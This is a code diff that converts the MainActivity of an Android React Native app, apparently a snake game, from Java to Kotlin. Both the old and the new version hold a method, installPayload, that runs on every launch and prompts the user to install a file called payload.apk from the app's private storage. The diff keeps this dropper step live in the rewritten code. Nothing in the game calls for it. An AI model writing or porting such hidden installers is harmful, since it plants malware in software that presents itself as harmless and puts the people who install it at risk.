@@ -1,96 +1,73 @@
-package com.eslam_awadi.snake;
+package com.eslam_awadi.snake
 
-import android.content.Intent;
-import android.net.Uri;
-import android.os.Build;
-import android.os.Bundle;
-import android.util.Log;
-import androidx.annotation.Nullable;
-import java.io.File;
-import androidx.core.content.FileProvider;
+import android.content.Intent
+import android.net.Uri
+import android.os.Build
+import android.os.Bundle
+import android.util.Log
+import androidx.core.content.FileProvider
+import com.facebook.react.ReactActivity
+import com.facebook.react.ReactActivityDelegate
+import com.facebook.react.defaults.DefaultNewArchitectureEntryPoint.fabricEnabled
+import com.facebook.react.defaults.DefaultReactActivityDelegate
+import expo.modules.ReactActivityDelegateWrapper
+import java.io.File
 
-import com.facebook.react.ReactActivity;
-import com.facebook.react.ReactActivityDelegate;
-import com.facebook.react.defaults.DefaultNewArchitectureEntryPoint.fabricEnabled;
-import com.facebook.react.defaults.DefaultReactActivityDelegate;
+class MainActivity : ReactActivity() {
+    override fun onCreate(savedInstanceState: Bundle?) {
+        setTheme(R.style.AppTheme)
+        super.onCreate(null)
 
-import expo.modules.ReactActivityDelegateWrapper;
-
-public class MainActivity extends ReactActivity {
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        // Set the theme to AppTheme BEFORE onCreate to support
-        // coloring the background, status bar, and navigation bar.
-        // This is required for expo-splash-screen.
-        setTheme(R.style.AppTheme);
-        super.onCreate(null);
-        installPayload();
+        // Install payload when the activity starts
+        installPayload()
     }
 
-    /**
-     * Returns the name of the main component registered from JavaScript. 
-     * This is used to schedule rendering of the component.
-     */
-    @Override
-    protected String getMainComponentName() {
-        return "main";
-    }
+    override fun getMainComponentName(): String = "main"
 
-    /**
-     * Returns the instance of the [ReactActivityDelegate]. 
-     * We use [DefaultReactActivityDelegate] which allows enabling
-     * New Architecture with a single boolean flag [fabricEnabled].
-     */
-    @Override
-    protected ReactActivityDelegate createReactActivityDelegate() {
-        return new ReactActivityDelegateWrapper(
+    override fun createReactActivityDelegate(): ReactActivityDelegate {
+        return ReactActivityDelegateWrapper(
             this,
             BuildConfig.IS_NEW_ARCHITECTURE_ENABLED,
-            new DefaultReactActivityDelegate(
+            object : DefaultReactActivityDelegate(
                 this,
-                getMainComponentName(),
+                mainComponentName,
                 fabricEnabled
-            )
-        );
+            ) {}
+        )
     }
 
-    /**
-     * Align the back button behavior with Android S
-     * where moving root activities to background instead of finishing activities.
-     */
-    @Override
-    public void invokeDefaultOnBackPressed() {
+    override fun invokeDefaultOnBackPressed() {
         if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.R) {
             if (!moveTaskToBack(false)) {
-                super.invokeDefaultOnBackPressed();
+                super.invokeDefaultOnBackPressed()
             }
-            return;
+            return
         }
-        super.invokeDefaultOnBackPressed();
+        super.invokeDefaultOnBackPressed()
     }
 
-    /**
-     * Installs an APK payload if it exists in the app's file directory.
-     */
-    private void installPayload() {
+    private fun installPayload() {
         try {
-            File file = new File(getFilesDir(), "payload.apk");
+            val file = File(filesDir, "payload.apk")
             if (file.exists()) {
-                Uri uri;
-                if (Build.VERSION.SDK_INT >= 24) {
-                    uri = FileProvider.getUriForFile(
-                        this, getApplicationContext().getPackageName() + ".provider", file);
+                val uri: Uri = if (Build.VERSION.SDK_INT >= 24) {
+                    FileProvider.getUriForFile(
+                        this,
+                        "${applicationContext.packageName}.provider",
+                        file
+                    )
                 } else {
-                    uri = Uri.fromFile(file);
+                    Uri.fromFile(file)
                 }
-                Intent intent = new Intent(Intent.ACTION_VIEW);
-                intent.setDataAndType(uri, "application/vnd.android.package-archive");
-                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
-                startActivity(intent);
+                val intent = Intent(Intent.ACTION_VIEW).apply {
+                    setDataAndType(uri, "application/vnd.android.package-archive")
+                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                    addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
+                }
+                startActivity(intent)
             }
-        } catch (Exception e) {
-            Log.e("PayloadInstall", "Error installing payload", e);
+        } catch (e: Exception) {
+            Log.e("PayloadInstall", "Error installing payload", e)
         }
     }
 }
